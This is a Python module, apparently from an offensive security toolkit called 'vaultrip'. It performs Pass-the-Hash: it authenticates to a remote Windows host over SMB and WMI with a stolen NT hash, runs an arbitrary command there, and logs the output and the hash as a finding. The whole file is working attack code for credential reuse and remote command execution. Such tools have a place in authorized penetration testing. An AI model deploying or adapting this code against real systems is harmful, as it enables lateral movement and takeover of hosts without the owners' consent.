# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Pass-the-Hash — execute a command on a remote Windows host using an NT hash.

Uses commonhuman_core.winexec.WinExecClient (SMB + WMI).
Requires: pip install vaultrip[attack]
"""

from __future__ import annotations

import logging

from ..reporter import PTHFinding, ScanResult

log = logging.getLogger("vaultrip.pth")


def run(
    result: ScanResult,
    *,
    target: str,
    attack_user: str,
    attack_hash: str,
    ad_domain: str = "",
    command: str = "whoami",
    timeout: int = 60,
) -> None:
    """Authenticate to *target* via Pass-the-Hash and execute *command*."""
    try:
        from commonhuman_core.winexec import WinExecClient
    except ImportError:
        result.append_error(
            "pth: commonhuman-core[smb] not installed — install vaultrip[attack] for PTH support."
        )
        return

    log.info("pth: %s\\%s @ %s → %r", ad_domain, attack_user, target, command)

    try:
        with WinExecClient.connect(
            target,
            user=attack_user,
            nt_hash=attack_hash,
            domain=ad_domain,
            timeout=30,
        ) as client:
            stdout, stderr, exit_code = client.execute(command, timeout=timeout)
    except Exception as exc:
        result.append_error(f"pth: {exc}")
        log.exception("pth: failed")
        finding = PTHFinding(
            target=target, username=attack_user, nt_hash=attack_hash,
            command=command, stdout="", exit_code=-1, success=False,
        )
        result.append_pth(finding)
        return

    success = exit_code == 0
    finding = PTHFinding(
        target=target,
        username=attack_user,
        nt_hash=attack_hash,
        command=command,
        stdout=(stdout + stderr).strip(),
        exit_code=exit_code,
        success=success,
    )
    result.append_pth(finding)

    status = "success" if success else f"exit={exit_code}"
    log.info("pth: %s — %s", target, status)
    if stdout.strip():
        log.info("pth: output: %s", stdout.strip()[:200])
